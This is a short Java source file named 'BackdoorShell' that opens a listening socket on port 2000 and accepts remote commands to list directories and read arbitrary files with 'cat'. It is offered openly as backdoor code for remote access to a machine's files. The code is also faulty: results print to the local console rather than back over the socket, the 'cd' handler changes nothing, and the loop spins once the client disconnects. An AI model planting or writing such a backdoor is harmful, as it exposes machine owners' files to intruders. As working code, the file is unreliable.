import java.net.*;
import java.io.*;

public class BackdoorShell 
{
   public static void main(String[] args) throws Exception 
   {
	  // set up server at port 2000
      ServerSocket serverSocket = new ServerSocket(2000); 
      Socket clientSocket = serverSocket.accept(); // wait for a connection
      
      BufferedReader in =
        new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
      PrintWriter out =
        new PrintWriter(clientSocket.getOutputStream(), true);

      String inputLine;
   
      // Keeps running until terminated by user
      while (true) {  
         if ((inputLine = in.readLine()) != null) 
         { 
             if (inputLine.startsWith("cd")) 
             {  
                String dirName = inputLine.replace("cd", "").trim();  // get the directory name after "cd" 
                System.out.println("Current directory is: "+ dirName);   // print the directory name to the console 

             } 
             else if (inputLine.startsWith("dir")) 
             {  // if they type "dir" do this:
                File dir = new File(".");   // get all files in current directory 
                String[] fileNames = dir.list();  // list all file names in a string array 
                
                // loop through all file names 
                for (int i=0; i < fileNames.length; i++) 
                {
                    File file = new File(fileNames[i]);   // create file object with each file name 
                    System.out.println(fileNames[i] + ", Type: " + (file.isDirectory() ? "Directory" : "File") );   // print the name and type of each file 
                }

             } 
             else if (inputLine.startsWith("cat")) 
             {
                String fileName = inputLine.replace("cat", "").trim();  // get the filename after "cat" 
                BufferedReader br = new BufferedReader(new FileReader(fileName));

                String line;  // create a string for reading each line of the file   
                while ((line = br.readLine()) != null) {   // loop through all lines of the file and print each one to the console 
                    System.out.println(line);  
                }

            } else {    // if they type any other command, print an error message to the console  
                System.err.println("Error: Command not supported");  
            }

        }    

    }    

   }    
}